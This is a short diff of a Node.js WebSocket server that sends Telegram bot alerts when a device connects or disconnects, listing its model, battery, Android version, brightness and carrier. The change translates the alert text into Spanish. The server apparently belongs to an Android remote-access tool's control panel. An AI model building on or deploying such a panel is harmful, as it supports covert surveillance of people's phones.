@@ -66,22 +66,22 @@ appSocket.on('connection', (ws, req) => {
         provider: provider
     })
     appBot.sendMessage(id,
-        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
-        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
-        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
-        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
-        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
-        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
+        `°• NUEVO DISPOSITIVO CONECTADO\n\n` +
+        `• modelo : <b>${model}</b>\n` +
+        `• CARGA : <b>${battery}</b>\n` +
+        `• SISTEMA : <b>${version}</b>\n` +
+        `• BRILLO : <b>${brightness}</b>\n` +
+        `• OPERADOR : <b>${provider}</b>`,
         {parse_mode: "HTML"}
     )
     ws.on('close', function () {
         appBot.sendMessage(id,
-            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
-            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
-            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
-            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
-            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
-            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
+            `°• DISPOSITIVO DESCONECTADO\n\n` +
+            `• MODELO : <b>${model}</b>\n` +
+            `• BATERIA : <b>${battery}</b>\n` +
+            `• SISTEMA : <b>${version}</b>\n` +
+            `• BRILLO : <b>${brightness}</b>\n` +
+            `• OPERADOR : <b>${provider}</b>`,
             {parse_mode: "HTML"}
         )
         appClients.delete(ws.uuid)
